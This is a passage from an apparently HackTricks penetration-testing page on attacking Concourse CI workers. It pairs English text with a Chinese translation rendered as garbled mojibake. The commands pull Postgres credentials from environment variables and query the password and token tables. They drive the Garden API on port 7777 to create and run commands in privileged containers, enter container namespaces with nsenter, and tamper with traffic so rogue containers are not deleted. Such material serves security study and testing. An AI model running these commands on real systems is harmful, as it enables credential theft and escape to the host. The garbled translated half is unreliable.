æ‚¨å¯ä»¥ä½¿ç”¨è¯¥å‡­æ®æ¥**ç™»å½•WebæœåŠ¡å™¨**ï¼Œå¹¶ä¸”**åˆ›å»ºä¸€ä¸ªç‰¹æƒå®¹å™¨ï¼Œç„¶åé€ƒè„±åˆ°èŠ‚ç‚¹**ã€‚

In the environment you can also find information to **access the postgresql** instance that concourse uses (address, **username**, **password** and database among other info):

åœ¨ç¯å¢ƒä¸­ï¼Œæ‚¨è¿˜å¯ä»¥æ‰¾åˆ°ä¿¡æ¯æ¥è®¿é—®å¤§å…ä½¿ç”¨çš„postgresql **å®ä¾‹ï¼ˆåœ°å€ï¼Œ**ç”¨æˆ·å**ï¼Œ**å¯†ç **å’Œæ•°æ®åº“ç­‰å…¶ä»–ä¿¡æ¯ï¼‰ï¼š

```bash
env | grep -i postg
CONCOURSE_RELEASE_POSTGRESQL_PORT_5432_TCP_ADDR=10.107.191.238
CONCOURSE_RELEASE_POSTGRESQL_PORT_5432_TCP_PORT=5432
CONCOURSE_RELEASE_POSTGRESQL_SERVICE_PORT_TCP_POSTGRESQL=5432
CONCOURSE_POSTGRES_USER=concourse
CONCOURSE_POSTGRES_DATABASE=concourse
CONCOURSE_POSTGRES_PASSWORD=concourse
[...]

# Access the postgresql db
psql -h 10.107.191.238 -U concourse -d concourse
select * from password; #Find hashed passwords
select * from access_tokens;
select * from auth_code;
select * from client;
select * from refresh_token;
select * from teams; #Change the permissions of the users in the teams
select * from users;
```

### Abusing Garden Service - Not a real Attack

###æ»¥ç”¨èŠ±å›­æœåŠ¡ - ä¸æ˜¯çœŸæ­£çš„æ”»å‡»

{% hint style="warning" %}

{ï¼…æç¤ºæ ·å¼=â€œè­¦å‘Šâ€ï¼…}
This are just some interesting notes about the service, but because it's only listening on localhost, this notes won't present any impact we haven't already exploited before

è¿™åªæ˜¯æœ‰å…³è¯¥æœåŠ¡çš„ä¸€äº›æœ‰è¶£çš„ç¬”è®°ï¼Œä½†æ˜¯ç”±äºå®ƒåªæ˜¯åœ¨Localä¸»æŒçš„æƒ…å†µä¸‹å¬ï¼Œæ‰€ä»¥è¯¥ç¬”è®°ä¸ä¼šç»™æˆ‘ä»¬ä»¥å‰å°šæœªåˆ©ç”¨ä»»ä½•å½±å“
{% endhint %}

By default each concourse worker will be running a [**Garden**](https://github.com/cloudfoundry/garden) service in port 7777. This service is used by the Web master to indicate the worker **what he needs to execute** (download the image and run each task). This sound pretty good for an attacker, but there are some nice protections:

é»˜è®¤æƒ…å†µä¸‹ï¼Œæ¯ä¸ªå¤§å…å·¥äººå°†åœ¨æ¸¯å£7777ä¸­è¿è¡Œ[** garden **]ï¼ˆhttps://github.com/cloudfoundry/gardenï¼‰æœåŠ¡ã€‚ç½‘ç»œä¸»äººä½¿ç”¨æ­¤æœåŠ¡æ¥æŒ‡ç¤ºå·¥ä½œäººå‘˜** éœ€è¦æ‰§è¡Œ**ï¼ˆä¸‹è½½å›¾åƒå¹¶è¿è¡Œæ¯ä¸ªä»»åŠ¡ï¼‰ã€‚ å¯¹äºæ”»å‡»è€…æ¥è¯´ï¼Œè¿™å¬èµ·æ¥ä¸é”™ï¼Œä½†æ˜¯æœ‰ä¸€äº›ä¸é”™çš„ä¿æŠ¤ï¼š

* It's just **exposed locally** (127..0.0.1) and I think when the worker authenticates agains the Web with the special SSH service, a tunnel is created so the web server can **talk to each Garden service** inside each worker.

*åªæ˜¯**åœ¨æœ¬åœ°æš´éœ²**ï¼ˆ127..0.0.1ï¼‰ï¼Œæˆ‘è®¤ä¸ºå½“å·¥äººé€šè¿‡ç‰¹æ®Šçš„SSHæœåŠ¡å†æ¬¡éªŒè¯ç½‘ç»œæ—¶ï¼Œåˆ›å»ºäº†ä¸€ä¸ªéš§é“ï¼Œä»¥ä¾¿WebæœåŠ¡å™¨å¯ä»¥**ä¸æ¯ä¸ªGarden Serviceäº¤è°ˆ*** *æ¯ä¸ªå·¥äººå†…éƒ¨ã€‚
* The web server is **monitoring the running containers every few seconds**, and **unexpected** containers are **deleted**. So if you want to **run a custom container** you need to **tamper** with the **communication** between the web server and the garden service.

*WebæœåŠ¡å™¨æ¯éš”å‡ ç§’é’Ÿç›‘è§†è¿è¡Œå®¹å™¨**ï¼Œå¹¶ä¸”**æ„å¤–**å·²åˆ é™¤** **ã€‚ å› æ­¤ï¼Œå¦‚æœæ‚¨æƒ³**è¿è¡Œè‡ªå®šä¹‰å®¹å™¨**ï¼Œåˆ™éœ€è¦**ç¯¡æ”¹**ä¸WebæœåŠ¡å™¨å’ŒèŠ±å›­æœåŠ¡ä¹‹é—´çš„**é€šä¿¡**ã€‚

Concourse workers run with high container privileges:

Concourseå·¥äººä»¥é«˜å®¹å™¨ç‰¹æƒè¿è¡Œï¼š

```
Container Runtime: docker
Has Namespaces:
	pid: true
	user: false
AppArmor Profile: kernel
Capabilities:
	BOUNDING -> chown dac_override dac_read_search fowner fsetid kill setgid setuid setpcap linux_immutable net_bind_service net_broadcast net_admin net_raw ipc_lock ipc_owner sys_module sys_rawio sys_chroot sys_ptrace sys_pacct sys_admin sys_boot sys_nice sys_resource sys_time sys_tty_config mknod lease audit_write audit_control setfcap mac_override mac_admin syslog wake_alarm block_suspend audit_read
Seccomp: disabled
```

However, techniques like **mounting** the /dev device of the node or release\_agent **won't work** (as the real device with the filesystem of the node isn't accesible, only a virtual one). We cannot access processes of the node, so escaping from the node without kernel exploits get complicated.

ä½†æ˜¯ï¼Œè¯¸å¦‚**å®‰è£…**èŠ‚ç‚¹çš„ /devè®¾å¤‡ä¹‹ç±»çš„æŠ€æœ¯æˆ–ç‰ˆæœ¬\ _agent **æ— æ³•ä½¿ç”¨**ï¼ˆå› ä¸ºå¸¦æœ‰èŠ‚ç‚¹çš„æ–‡ä»¶ç³»ç»Ÿçš„çœŸå®è®¾å¤‡ä¸å¯å¸å¼•ï¼Œåªæœ‰ä¸€ä¸ªè™šæ‹Ÿçš„è®¾å¤‡ï¼‰ã€‚ æˆ‘ä»¬æ— æ³•è®¿é—®èŠ‚ç‚¹çš„è¿‡ç¨‹ï¼Œå› æ­¤åœ¨æ²¡æœ‰å†…æ ¸æ¼æ´çš„æƒ…å†µä¸‹ä»èŠ‚ç‚¹é€ƒè„±ä¼šå˜å¾—å¤æ‚ã€‚

{% hint style="info" %}

{ï¼…æç¤ºæ ·å¼=â€œ infoâ€ï¼…}
In the previous section we saw how to escape from a privileged container, so if we can **execute** commands in a **privileged container** created by the **current** **worker**, we could **escape to the node**.

åœ¨ä¸Šä¸€èŠ‚ä¸­ï¼Œæˆ‘ä»¬çœ‹åˆ°äº†å¦‚ä½•é€ƒç¦»ç‰¹æƒå®¹å™¨ï¼Œå› æ­¤ï¼Œå¦‚æœæˆ‘ä»¬å¯ä»¥åœ¨**ç‰¹æƒå®¹å™¨ä¸­æ‰§è¡Œ**å‘½ä»¤**ç”±** Current ** **å·¥äºº**åˆ›å»ºçš„**ï¼Œæˆ‘ä»¬å¯ä»¥** é€ƒåˆ°èŠ‚ç‚¹**ã€‚
{% endhint %}

Note that playing with concourse I noted that when a new container is spawned to run something, the container processes are accessible from the worker container, so it's like a container creating a new container inside of it.

è¯·æ³¨æ„ï¼Œä¸Concourseä¸€èµ·ç©ï¼Œæˆ‘æ³¨æ„åˆ°ï¼Œå½“å‚¬ç”Ÿæ–°å®¹å™¨ä»¥è¿è¡ŒæŸäº›ä¸œè¥¿æ—¶ï¼Œå¯ä»¥ä»Workerå®¹å™¨ä¸­è®¿é—®å®¹å™¨è¿‡ç¨‹ï¼Œå› æ­¤å°±åƒä¸€ä¸ªå®¹å™¨ä¸€æ ·ï¼Œåœ¨å…¶ä¸­åˆ›å»ºäº†ä¸€ä¸ªæ–°çš„å®¹å™¨ã€‚

#### Getting inside a running privileged container

####è¿›å…¥è¿è¡Œçš„ç‰¹æƒå®¹å™¨

```bash
# Get current container
curl 127.0.0.1:7777/containers
{"Handles":["ac793559-7f53-4efc-6591-0171a0391e53","c6cae8fc-47ed-4eab-6b2e-f3bbe8880690"]}

# Get container info
curl 127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/info
curl 127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/properties

# Execute a new process inside a container
# In this case "sleep 20000" will be executed in the container with handler ac793559-7f53-4efc-6591-0171a0391e53
wget -v -O- --post-data='{"id":"task2","path":"sh","args":["-cx","sleep 20000"],"dir":"/tmp/build/e55deab7","rlimits":{},"tty":{"window_size":{"columns":500,"rows":500}},"image":{}}' \
  --header='Content-Type:application/json' \
  'http://127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/processes'
  
# OR instead of doing all of that, you could just get into the ns of the process of the privileged container
nsenter --target 76011 --mount --uts --ipc --net --pid -- sh
```

#### Creating a new privileged container

####åˆ›å»ºä¸€ä¸ªæ–°çš„ç‰¹æƒå®¹å™¨

You can very easily create a new container (just run a random UID) and execute something on it:

æ‚¨å¯ä»¥éå¸¸è½»æ¾åœ°åˆ›å»ºä¸€ä¸ªæ–°å®¹å™¨ï¼ˆåªéœ€è¿è¡Œä¸€ä¸ªéšæœºUIDï¼‰å¹¶åœ¨å…¶ä¸Šæ‰§è¡ŒæŸäº›å†…å®¹ï¼š

```bash
curl -X POST http://127.0.0.1:7777/containers \
   -H 'Content-Type: application/json' \
   -d '{"handle":"123ae8fc-47ed-4eab-6b2e-123458880690","rootfs":"raw:///concourse-work-dir/volumes/live/ec172ffd-31b8-419c-4ab6-89504de17196/volume","image":{},"bind_mounts":[{"src_path":"/concourse-work-dir/volumes/live/9f367605-c9f0-405b-7756-9c113eba11f1/volume","dst_path":"/scratch","mode":1}],"properties":{"user":""},"env":["BUILD_ID=28","BUILD_NAME=24","BUILD_TEAM_ID=1","BUILD_TEAM_NAME=main","ATC_EXTERNAL_URL=http://127.0.0.1:8080"],"limits":{"bandwidth_limits":{},"cpu_limits":{},"disk_limits":{},"memory_limits":{},"pid_limits":{}}}'

# Wget will be stucked there as long as the process is being executed
wget -v -O- --post-data='{"id":"task2","path":"sh","args":["-cx","sleep 20000"],"dir":"/tmp/build/e55deab7","rlimits":{},"tty":{"window_size":{"columns":500,"rows":500}},"image":{}}' \
  --header='Content-Type:application/json' \
  'http://127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/processes'
```

However, the web server is checking every few seconds the containers that are running, and if an unexpected one is discovered, it will be deleted. As the communication is occurring in HTTP, you could tamper the communication to avoid the deletion of unexpected containers:

ä½†æ˜¯ï¼ŒWebæœåŠ¡å™¨æ¯éš”å‡ ç§’é’Ÿæ£€æŸ¥è¿è¡Œçš„å®¹å™¨ï¼Œå¦‚æœå‘ç°äº†ä¸€ä¸ªæ„å¤–çš„å®¹å™¨ï¼Œå°†ä¼šåˆ é™¤å®ƒã€‚ éšç€HTTPä¸­çš„é€šä¿¡å‘ç”Ÿï¼Œæ‚¨å¯ä»¥ç¯¡æ”¹é€šä¿¡ä»¥é¿å…åˆ é™¤æ„å¤–å®¹å™¨ï¼š

```
GET /containers HTTP/1.1.
Host: 127.0.0.1:7777.
User-Agent: Go-http-client/1.1.
Accept-Encoding: gzip.
.

T 127.0.0.1:7777 -> 127.0.0.1:59722 [AP] #157
HTTP/1.1 200 OK.
Content-Type: application/json.
Date: Thu, 17 Mar 2022 22:42:55 GMT.
Content-Length: 131.
.
{"Handles":["123ae8fc-47ed-4eab-6b2e-123458880690","ac793559-7f53-4efc-6591-0171a0391e53","c6cae8fc-47ed-4eab-6b2e-f3bbe8880690"]}

T 127.0.0.1:59722 -> 127.0.0.1:7777 [AP] #159
DELETE /containers/123ae8fc-47ed-4eab-6b2e-123458880690 HTTP/1.1.
Host: 127.0.0.1:7777.
User-Agent: Go-http-client/1.1.
Accept-Encoding: gzip.
```

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

<summary> <strong>æ”¯æŒhacktrickså¹¶è·å¾—å¥½å¤„ï¼</strong> </summary>

- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

 - æ‚¨åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿ æ‚¨æ˜¯å¦æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨hacktricks **ä¸­åˆŠç™»å¹¿å‘Šï¼Ÿ è¿˜æ˜¯æ‚¨æƒ³è®¿é—®**æœ€æ–°ç‰ˆæœ¬çš„è±Œè±†æˆ–åœ¨pdf **ä¸­ä¸‹è½½hacktricksï¼Ÿ æ£€æŸ¥[**è®¢é˜…è®¡åˆ’**]ï¼ˆhttps://github.com/sponsors/carlospolopï¼‰ï¼

- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

 - å‘ç°[**è±Œè±†å®¶åº­**]ï¼ˆhttps://opensea.io/collection/the-peass-familyï¼‰ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[** nfts **]ï¼ˆhttps://opensea.io/collectionï¼‰ /å®¶åº­å®¶åº­ï¼‰

- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

 - è·å–[**å®˜æ–¹è±Œè±†å’Œhacktricksèµƒç‰©**]ï¼ˆhttps://peass.creator-spring.comï¼‰

- **Join the** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**

 -  **åŠ å…¥** [**ğŸ’¬**]ï¼ˆhttps://emojipedia.org/speech-balloon/ï¼‰[** discord group **]ï¼ˆhttps://discord.gg/hrep4ruj7fï¼‰æˆ–[ **ç”µæŠ¥ç»„**]ï¼ˆhttps://t.me/peassï¼‰æˆ–**åœ¨** Twitter ** [**ğŸ¦**]ï¼ˆhttps://github.com/carloppolop/hacktrickss on ** twitter **ï¼‰ /ree/7af18b62b3bdc423e114444444677a6a73d4043511e9/ \ [https:/emojipedia.org/bird/bird/readme.mdï¼‰eardme.mdï¼‰eghterme.mdï¼‰eghterme.mdï¼‰eghterme.mdï¼‰eghtemplopmbyth

- **Share your hacking tricks by submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**

 -  **é€šè¿‡å°†PRSæäº¤ç»™** [** hacktricks github repo **]ï¼ˆhttps://github.com/carloppolop/hacktricksï¼‰**ã€‚

</details>
